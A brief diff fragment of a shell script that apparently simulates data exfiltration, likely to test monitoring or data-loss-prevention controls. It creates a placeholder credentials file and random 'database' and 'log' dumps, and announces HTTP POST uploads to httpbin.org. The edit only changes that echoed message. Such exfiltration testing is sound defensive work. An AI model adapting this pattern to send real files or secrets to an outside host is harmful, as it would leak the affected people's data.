@@ -21,7 +21,7 @@ echo "User credentials and passwords" > /tmp/data/credentials.txt
 dd if=/dev/urandom bs=1M count=50 of=/tmp/data/database.dump 2>/dev/null
 dd if=/dev/urandom bs=1M count=50 of=/tmp/data/logs.tar.gz 2>/dev/null
 
-echo "Exfiltrating files via HTTP POST requests to http://httpbin.org/post ... "
+echo "Exfiltrating files via HTTP POST requests to http://httpbin.org ... "
 
 # Multiple file uploads 
 error=""
